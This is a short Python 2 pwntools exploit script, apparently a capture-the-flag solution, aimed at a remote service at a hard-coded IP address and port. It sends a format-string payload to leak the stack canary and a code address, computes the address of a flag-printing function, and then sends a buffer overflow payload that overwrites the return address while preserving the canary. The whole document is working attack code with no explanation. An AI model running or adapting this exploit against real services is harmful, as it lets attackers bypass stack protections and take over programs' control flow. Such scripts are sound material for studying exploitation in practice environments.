from pwn import *

r = remote("54.224.176.60", 1414)

pl = "%p." * 0x40

r.recvuntil("want :")

r.sendline(pl)

leak = r.recvline()

leak = leak.split(".")
print leak

main_27 = int(leak[12], 16)
cookie = int(leak[29], 16)
catFlag = main_27 - 0x27 - 18753

print "COOKIE: %x" % cookie
print "MAIN + 27: %x" % main_27
print "CATFLAG: %x" % catFlag

# pl = padding + stack_cookie + ebp + getflag
pl = "A"*0x40 + p32(cookie) + "BBBB" + p32(catFlag)

#print pl, len(pl)

r.recvuntil("??? :")
r.sendline(pl)

r.interactive()
